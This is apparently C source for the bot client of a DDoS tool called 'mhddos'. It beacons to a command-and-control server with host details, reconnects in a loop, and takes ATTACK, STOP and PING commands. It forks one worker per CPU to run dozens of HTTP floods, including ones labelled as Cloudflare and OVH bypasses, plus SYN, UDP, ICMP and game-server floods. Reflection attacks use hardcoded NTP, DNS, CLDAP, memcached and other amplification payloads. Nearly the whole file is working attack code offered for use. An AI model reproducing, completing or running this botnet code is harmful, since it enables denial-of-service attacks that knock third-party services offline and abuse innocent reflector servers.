#include "mhddos.h"
#include <stdarg.h>
#include <sys/utsname.h>
#include <sys/wait.h>
#include <sys/resource.h>
#include <sys/mman.h>
#include <sys/file.h>

#ifndef SERVER_HOST
#define SERVER_HOST "0.0.0.0"
#endif
#ifndef SERVER_PORT
#define SERVER_PORT 8443
#endif
#define RECONNECT_DELAY 5
#define CMD_BUF_SIZE 4096
#define MAX_ARGS 64
#define LOCK_FILE "/tmp/.mhddos.lock"

static volatile int g_child_pid = 0;
static volatile int g_attack_running = 0;
static int g_server_sock = -1;
static int g_lock_fd = -1;
static volatile int *g_shared_running = NULL;
static pid_t *g_worker_pids = NULL;
static int g_worker_count = 0;
static volatile int g_stop_requested = 0;

static int acquire_instance_lock(void) {
    g_lock_fd = open(LOCK_FILE, O_CREAT | O_RDWR, 0600);
    if (g_lock_fd < 0) return 0;
    if (flock(g_lock_fd, LOCK_EX | LOCK_NB) < 0) {
        close(g_lock_fd);
        g_lock_fd = -1;
        return 0;
    }
    char pid_str[32];
    int len = snprintf(pid_str, sizeof(pid_str), "%d\n", getpid());
    if (ftruncate(g_lock_fd, 0) == 0) {
        lseek(g_lock_fd, 0, SEEK_SET);
        if (write(g_lock_fd, pid_str, len) < 0) {}
    }
    return 1;
}

static void release_instance_lock(void) {
    if (g_lock_fd >= 0) {
        flock(g_lock_fd, LOCK_UN);
        close(g_lock_fd);
        unlink(LOCK_FILE);
        g_lock_fd = -1;
    }
}

static int get_max_workers(void) {
    long n = sysconf(_SC_NPROCESSORS_ONLN);
    if (n < 1) n = 1;
    if (n > 4096) n = 4096;
    return (int)n;
}

static void get_arch_string(char *buf, int buflen) {
    struct utsname u;
    if (uname(&u) == 0) snprintf(buf, buflen, "%s", u.machine);
    else snprintf(buf, buflen, "unknown");
}

static void get_os_info(char *buf, int buflen) {
    struct utsname u;
    if (uname(&u) == 0) snprintf(buf, buflen, "%s %s %s", u.sysname, u.release, u.machine);
    else snprintf(buf, buflen, "unknown");
}

static int connect_to_server(const char *host, int port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    struct sockaddr_in addr;
    memset(&addr, 0, sizeof(addr));
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    if (inet_pton(AF_INET, host, &addr.sin_addr) <= 0) {
        struct hostent *he = gethostbyname(host);
        if (!he) { close(sock); return -1; }
        memcpy(&addr.sin_addr, he->h_addr_list[0], he->h_length);
    }
    struct timeval tv = {10, 0};
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        close(sock);
        return -1;
    }
    tv.tv_sec = 120;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
    int flag = 1;
    setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
    return sock;
}

static int send_line(int sock, const char *fmt, ...) {
    char buf[CMD_BUF_SIZE];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) {
        buf[n] = '\n';
        n++;
        int sent = 0;
        while (sent < n) {
            int r = send(sock, buf + sent, n - sent, MSG_NOSIGNAL);
            if (r < 0) {
                if (errno == EINTR) continue;
                return -1;
            }
            if (r == 0) return -1;
            sent += r;
        }
    }
    return 0;
}

static int recv_line(int sock, char *buf, int buflen) {
    int pos = 0;
    while (pos < buflen - 1) {
        char c;
        int r = recv(sock, &c, 1, 0);
        if (r < 0) {
            if (errno == EINTR) continue;
            return -1;
        }
        if (r == 0) return -1;
        if (c == '\n') break;
        if (c != '\r') buf[pos++] = c;
    }
    buf[pos] = '\0';
    return pos;
}

static volatile int *create_shared_flag(void) {
    volatile int *flag = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
    if (flag == MAP_FAILED) return NULL;
    *flag = 0;
    return flag;
}

static void destroy_shared_flag(volatile int *flag) {
    if (flag && flag != MAP_FAILED) munmap((void*)flag, sizeof(int));
}

static void kill_all_workers_now(void) {
    if (g_shared_running) *g_shared_running = 0;
    for (int i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) kill(g_worker_pids[i], SIGKILL);
    }
    for (int i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) {
            waitpid(g_worker_pids[i], NULL, 0);
            g_worker_pids[i] = 0;
        }
    }
    g_worker_count = 0;
}

static void stop_current_attack(void) {
    if (g_child_pid > 0) {
        kill(g_child_pid, SIGKILL);
        waitpid(g_child_pid, NULL, 0);
        g_child_pid = 0;
    }
    g_attack_running = 0;
}

static void sigchld_handler(int sig) {
    (void)sig;
    int status;
    pid_t p;
    while ((p = waitpid(-1, &status, WNOHANG)) > 0) {
        if (p == g_child_pid) {
            g_child_pid = 0;
            g_attack_running = 0;
        }
    }
}

static void coordinator_handle_signal(int sig) {
    (void)sig;
    g_stop_requested = 1;
    if (g_shared_running) *g_shared_running = 0;
    kill_all_workers_now();
    _exit(0);
}

static void run_attack_in_child(int argc, char **argv);

static void set_amp_payload(layer4_args_t *args, const uint8_t *payload, int len, int port) {
    memcpy(args->amp_payload, payload, len);
    args->amp_payload_len = len;
    args->amp_port = port;
}

static void execute_attack(int argc, char **argv) {
    if (argc < 2) return;
    char one[64];
    strncpy(one, argv[1], sizeof(one) - 1);
    one[sizeof(one) - 1] = '\0';
    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);
    if (strcmp(one, "STOP") == 0) {
        stop_current_attack();
        return;
    }
    method_t method = parse_method(one);
    if (method == METHOD_UNKNOWN) return;
    if (argc < 3) return;
    stop_current_attack();
    pid_t pid = fork();
    if (pid < 0) return;
    if (pid == 0) {
        if (g_server_sock >= 0) close(g_server_sock);
        if (g_lock_fd >= 0) close(g_lock_fd);
        signal(SIGCHLD, SIG_DFL);
        signal(SIGPIPE, SIG_IGN);
        struct sigaction sa;
        memset(&sa, 0, sizeof(sa));
        sa.sa_handler = coordinator_handle_signal;
        sigemptyset(&sa.sa_mask);
        sa.sa_flags = 0;
        sigaction(SIGTERM, &sa, NULL);
        sigaction(SIGINT, &sa, NULL);
        run_attack_in_child(argc, argv);
        _exit(0);
    } else {
        g_child_pid = pid;
        g_attack_running = 1;
    }
}

static void worker_l7(layer7_args_t *args) {
    switch (args->method) {
        case METHOD_GET: flood_get(args); break;
        case METHOD_POST: flood_post(args); break;
        case METHOD_STRESS: flood_stress(args); break;
        case METHOD_PPS: flood_pps(args); break;
        case METHOD_EVEN: flood_even(args); break;
        case METHOD_OVH: flood_ovh(args); break;
        case METHOD_NULL: flood_null(args); break;
        case METHOD_COOKIE: flood_cookie(args); break;
        case METHOD_APACHE: flood_apache(args); break;
        case METHOD_XMLRPC: flood_xmlrpc(args); break;
        case METHOD_BOT: flood_bot(args); break;
        case METHOD_DYN: flood_dyn(args); break;
        case METHOD_SLOW: flood_slow(args); break;
        case METHOD_CFBUAM: flood_cfbuam(args); break;
        case METHOD_AVB: flood_avb(args); break;
        case METHOD_DOWNLOADER: flood_downloader(args); break;
        case METHOD_RHEX: flood_rhex(args); break;
        case METHOD_STOMP: flood_stomp(args); break;
        case METHOD_GSB: flood_gsb(args); break;
        case METHOD_CFB: flood_cfb(args); break;
        case METHOD_BYPASS: flood_bypass(args); break;
        case METHOD_DGB: flood_dgb(args); break;
        case METHOD_TOR: flood_tor(args); break;
        case METHOD_KILLER: flood_killer(args); break;
        case METHOD_HEAD: flood_get(args); break;
        default: flood_get(args); break;
    }
}

static void worker_l4(layer4_args_t *args) {
    switch (args->method) {
        case METHOD_TCP: flood_tcp(args); break;
        case METHOD_UDP: flood_udp(args); break;
        case METHOD_SYN: flood_syn(args); break;
        case METHOD_ICMP: flood_icmp(args); break;
        case METHOD_VSE: flood_vse(args); break;
        case METHOD_TS3: flood_ts3(args); break;
        case METHOD_MCPE: flood_mcpe(args); break;
        case METHOD_FIVEM: flood_fivem(args); break;
        case METHOD_FIVEM_TOKEN: flood_fivem_token(args); break;
        case METHOD_OVH_UDP: flood_ovhudp(args); break;
        case METHOD_MINECRAFT: flood_minecraft(args); break;
        case METHOD_CPS: flood_cps(args); break;
        case METHOD_CONNECTION: flood_connection(args); break;
        case METHOD_MCBOT: flood_mcbot(args); break;
        case METHOD_MEM: case METHOD_NTP: case METHOD_DNS_AMP:
        case METHOD_ARD: case METHOD_CLDAP: case METHOD_CHAR:
        case METHOD_RDP: flood_amp(args); break;
        default: break;
    }
}

static void finish_attack_and_exit(void) {
    if (g_shared_running) *g_shared_running = 0;
    for (int i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) kill(g_worker_pids[i], SIGKILL);
    }
    for (int i = 0; i < g_worker_count; i++) {
        if (g_worker_pids[i] > 0) waitpid(g_worker_pids[i], NULL, 0);
    }
    if (g_shared_running) destroy_shared_flag(g_shared_running);
    if (g_worker_pids) free(g_worker_pids);
    _exit(0);
}

static void run_attack_in_child(int argc, char **argv) {
    struct rlimit rl = {65535, 65535};
    setrlimit(RLIMIT_NOFILE, &rl);
    srand(time(NULL) ^ getpid());
    get_local_ip(g_local_ip, sizeof(g_local_ip));
    char one[64];
    strncpy(one, argv[1], sizeof(one) - 1);
    one[sizeof(one) - 1] = '\0';
    for (int i = 0; one[i]; i++) one[i] = toupper((unsigned char)one[i]);
    method_t method = parse_method(one);
    if (method == METHOD_UNKNOWN) _exit(1);
    int workers = get_max_workers();
    g_shared_running = create_shared_flag();
    if (!g_shared_running) _exit(1);
    g_stop_requested = 0;
    g_worker_pids = NULL;
    g_worker_count = 0;
    char urlraw[4096];
    memset(urlraw, 0, sizeof(urlraw));
    strncpy(urlraw, argv[2], sizeof(urlraw) - 1);
    char *p = urlraw;
    while (*p && isspace((unsigned char)*p)) p++;
    if (strncmp(p, "http", 4) != 0) {
        char tmp[4096];
        snprintf(tmp, sizeof(tmp), "http://%s", p);
        strncpy(urlraw, tmp, sizeof(urlraw) - 1);
    }
    if (is_layer7(method)) {
        if (argc < 7) _exit(1);
        url_t target;
        parse_url(urlraw, &target);
        char host_ip[256];
        if (strcmp(one, "TOR") != 0) {
            if (!resolve_host(target.host, host_ip, sizeof(host_ip))) _exit(1);
        } else strncpy(host_ip, target.host, sizeof(host_ip));
        int rpc = atoi(argv[5]);
        int timer = atoi(argv[6]);
        int proxy_ty = atoi(argv[3]);
        char proxy_path[512];
        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[4]);
        char **useragents = NULL;
        int ua_count = load_lines("files/useragent.txt", &useragents, MAX_USERAGENTS);
        if (ua_count == 0) _exit(1);
        char **referers = NULL;
        int ref_count = load_lines("files/referers.txt", &referers, MAX_REFERERS);
        if (ref_count == 0) _exit(1);
        proxy_t *proxies = NULL;
        int proxy_count = 0;
        proxy_type_t pt = (proxy_type_t)proxy_ty;
        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
        if (pt != PROXY_NONE) {
            proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
            if (proxy_arr) {
                proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                if (proxy_count > 0) proxies = proxy_arr;
                else free(proxy_arr);
            }
        }
        g_worker_pids = malloc(sizeof(pid_t) * workers);
        *g_shared_running = 1;
        for (int i = 0; i < workers; i++) {
            pid_t wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                srand(time(NULL) ^ getpid() ^ i);
                layer7_args_t wargs;
                memset(&wargs, 0, sizeof(wargs));
                wargs.target = target;
                strncpy(wargs.host_ip, host_ip, sizeof(wargs.host_ip));
                wargs.method = method;
                wargs.rpc = rpc;
                wargs.thread_id = i;
                wargs.proxies = proxies;
                wargs.proxy_count = proxy_count;
                wargs.useragents = useragents;
                wargs.useragent_count = ua_count;
                wargs.referers = referers;
                wargs.referer_count = ref_count;
                wargs.running = g_shared_running;
                wargs.use_ssl = (strcasecmp(target.scheme, "https") == 0);
                strncpy(wargs.local_ip, g_local_ip, sizeof(wargs.local_ip));
                worker_l7(&wargs);
                _exit(0);
            } else g_worker_pids[g_worker_count++] = wpid;
        }
        struct timespec start, now;
        clock_gettime(CLOCK_MONOTONIC, &start);
        while (!g_stop_requested) {
            clock_gettime(CLOCK_MONOTONIC, &now);
            if ((now.tv_sec - start.tv_sec) >= timer) break;
            usleep(50000);
        }
        finish_attack_and_exit();
    } else if (is_layer4(method)) {
        if (argc < 4) _exit(1);
        url_t target;
        parse_url(urlraw, &target);
        char target_ip[256];
        if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
        int port = target.port;
        if (port > 65535 || port < 1) _exit(1);
        if ((method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD || method == METHOD_SYN || method == METHOD_ICMP) && !check_raw_socket()) _exit(1);
        int timer = atoi(argv[3]);
        proxy_t *proxies = NULL;
        int proxy_count = 0;
        char **refs = NULL;
        int ref_count = 0;
        if (!port) port = 80;
        if (argc >= 5) {
            char *argfour = argv[4];
            while (*argfour && isspace((unsigned char)*argfour)) argfour++;
            if (strlen(argfour) > 0) {
                if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR || method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) {
                    char refl_path[512];
                    snprintf(refl_path, sizeof(refl_path), "files/%s", argfour);
                    FILE *rf = fopen(refl_path, "r");
                    if (!rf) _exit(1);
                    refs = malloc(sizeof(char*) * MAX_REFS);
                    char line[256];
                    while (fgets(line, sizeof(line), rf) && ref_count < MAX_REFS) {
                        line[strcspn(line, "\r\n")] = 0;
                        if (strlen(line) > 6) refs[ref_count++] = strdup(line);
                    }
                    fclose(rf);
                    if (ref_count == 0) _exit(1);
                } else {
                    int is_digit = 1;
                    for (int i = 0; argfour[i]; i++) if (!isdigit((unsigned char)argfour[i])) { is_digit = 0; break; }
                    if (is_digit && argc >= 6) {
                        int proxy_ty = atoi(argfour);
                        proxy_type_t pt = (proxy_type_t)proxy_ty;
                        if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
                        char proxy_path[512];
                        snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[5]);
                        proxy_t *proxy_arr = malloc(sizeof(proxy_t) * MAX_PROXIES);
                        if (proxy_arr) {
                            proxy_count = load_proxies(proxy_path, proxy_arr, MAX_PROXIES, pt);
                            if (proxy_count > 0) proxies = proxy_arr;
                            else free(proxy_arr);
                        }
                        if (method != METHOD_MINECRAFT && method != METHOD_MCBOT && method != METHOD_TCP && method != METHOD_CPS && method != METHOD_CONNECTION) _exit(1);
                    }
                }
            }
        }
        int protocolid = MINECRAFT_DEFAULT_PROTOCOL;
        if (method == METHOD_MCBOT) {
            int probe = socket(AF_INET, SOCK_STREAM, 0);
            if (probe >= 0) {
                struct sockaddr_in addr;
                memset(&addr, 0, sizeof(addr));
                addr.sin_family = AF_INET;
                addr.sin_port = htons(port);
                inet_pton(AF_INET, target_ip, &addr.sin_addr);
                struct timeval tv = {2, 0};
                setsockopt(probe, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
                setsockopt(probe, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
                if (connect(probe, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
                    uint8_t hs[1024];
                    int hslen = mc_handshake(target_ip, port, protocolid, 1, hs);
                    send(probe, hs, hslen, 0);
                    uint8_t ping_pkt[16];
                    uint8_t zero = 0x00;
                    int pinglen = mc_data(&zero, 1, ping_pkt);
                    send(probe, ping_pkt, pinglen, 0);
                    uint8_t resp[1024];
                    int rlen = recv(probe, resp, sizeof(resp), 0);
                    if (rlen > 0) {
                        char *pp = strstr((char*)resp, "\"protocol\":");
                        if (pp) {
                            int pv = atoi(pp + 11);
                            if (pv > 47 && pv < 758) protocolid = pv;
                        }
                    }
                }
                close(probe);
            }
        }
        g_worker_pids = malloc(sizeof(pid_t) * workers);
        *g_shared_running = 1;
        for (int i = 0; i < workers; i++) {
            pid_t wpid = fork();
            if (wpid < 0) continue;
            if (wpid == 0) {
                srand(time(NULL) ^ getpid() ^ i);
                layer4_args_t wargs;
                memset(&wargs, 0, sizeof(wargs));
                strncpy(wargs.target_ip, target_ip, sizeof(wargs.target_ip));
                wargs.target_port = port;
                wargs.method = method;
                wargs.protocolid = protocolid;
                wargs.proxies = proxies;
                wargs.proxy_count = proxy_count;
                wargs.refs = refs;
                wargs.ref_count = ref_count;
                wargs.running = g_shared_running;
                strncpy(wargs.local_ip, g_local_ip, sizeof(wargs.local_ip));
                if (method == METHOD_ICMP) wargs.target_port = 0;
                if (method == METHOD_RDP) { uint8_t pay[] = {0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xff,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp_payload(&wargs, pay, 16, 3389); }
                else if (method == METHOD_CLDAP) { uint8_t pay[] = {0x30,0x25,0x02,0x01,0x01,0x63,0x20,0x04,0x00,0x0a,0x01,0x00,0x0a,0x01,0x00,0x02,0x01,0x00,0x02,0x01,0x00,0x01,0x01,0x00,0x87,0x0b,0x6f,0x62,0x6a,0x65,0x63,0x74,0x63,0x6c,0x61,0x73,0x73,0x30,0x00}; set_amp_payload(&wargs, pay, 39, 389); }
                else if (method == METHOD_MEM) { uint8_t pay[] = {0x00,0x01,0x00,0x00,0x00,0x01,0x00,0x00,'g','e','t','s',' ','p',' ','h',' ','e','\n'}; set_amp_payload(&wargs, pay, 19, 11211); }
                else if (method == METHOD_CHAR) { uint8_t pay[] = {0x01}; set_amp_payload(&wargs, pay, 1, 19); }
                else if (method == METHOD_ARD) { uint8_t pay[] = {0x00,0x14,0x00,0x00}; set_amp_payload(&wargs, pay, 4, 3283); }
                else if (method == METHOD_NTP) { uint8_t pay[] = {0x17,0x00,0x03,0x2a,0x00,0x00,0x00,0x00}; set_amp_payload(&wargs, pay, 8, 123); }
                else if (method == METHOD_DNS_AMP) { uint8_t pay[] = {0x45,0x67,0x01,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x01,0x02,0x73,0x6c,0x00,0x00,0xff,0x00,0x01,0x00,0x00,0x29,0xff,0xff,0x00,0x00,0x00,0x00,0x00,0x00}; set_amp_payload(&wargs, pay, 31, 53); }
                worker_l4(&wargs);
                _exit(0);
            } else g_worker_pids[g_worker_count++] = wpid;
        }
        struct timespec start, now;
        clock_gettime(CLOCK_MONOTONIC, &start);
        while (!g_stop_requested) {
            clock_gettime(CLOCK_MONOTONIC, &now);
            if ((now.tv_sec - start.tv_sec) >= timer) break;
            usleep(50000);
        }
        finish_attack_and_exit();
    }
}

static void handle_command(const char *cmd_line) {
    if (!cmd_line || strlen(cmd_line) == 0) return;
    char buf[CMD_BUF_SIZE];
    strncpy(buf, cmd_line, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = '\0';
    char *args[MAX_ARGS];
    int argc = 0;
    args[argc++] = "mhddos";
    char *p = buf;
    while (*p && argc < MAX_ARGS) {
        while (*p && isspace((unsigned char)*p)) p++;
        if (!*p) break;
        args[argc++] = p;
        while (*p && !isspace((unsigned char)*p)) p++;
        if (*p) *p++ = '\0';
    }
    if (argc < 2) return;
    execute_attack(argc, args);
}

static void cleanup_and_exit(void) {
    stop_current_attack();
    release_instance_lock();
}

int main(int argc, char *argv[]) {
    if (!acquire_instance_lock()) _exit(0);
    atexit(cleanup_and_exit);
    const char *server_host = SERVER_HOST;
    int server_port = SERVER_PORT;
    if (argc >= 2) server_host = argv[1];
    if (argc >= 3) server_port = atoi(argv[2]);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART | SA_NOCLDSTOP;
    sigaction(SIGCHLD, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);
    srand(time(NULL) ^ getpid());
    get_local_ip(g_local_ip, sizeof(g_local_ip));
    char arch[64];
    char osinfo[256];
    get_arch_string(arch, sizeof(arch));
    get_os_info(osinfo, sizeof(osinfo));
    while (1) {
        int sock = connect_to_server(server_host, server_port);
        g_server_sock = sock;
        if (sock < 0) { sleep(RECONNECT_DELAY); continue; }
        if (send_line(sock, "HELLO|%s|%s|%s", arch, osinfo, g_local_ip) < 0) { close(sock); sleep(RECONNECT_DELAY); continue; }
        while (1) {
            char cmd[CMD_BUF_SIZE];
            int n = recv_line(sock, cmd, sizeof(cmd));
            if (n < 0) break;
            if (n == 0) continue;
            if (strcmp(cmd, "PING") == 0) { if (send_line(sock, "PONG|%s|%d", arch, g_attack_running ? 1 : 0) < 0) break; continue; }
            if (strcmp(cmd, "STOP") == 0) { stop_current_attack(); send_line(sock, "STATUS|stopped"); continue; }
            if (strncmp(cmd, "ATTACK|", 7) == 0) { handle_command(cmd + 7); send_line(sock, "STATUS|attacking"); continue; }
            handle_command(cmd);
        }
        close(sock);
        stop_current_attack();
        sleep(RECONNECT_DELAY);
    }
    return 0;
}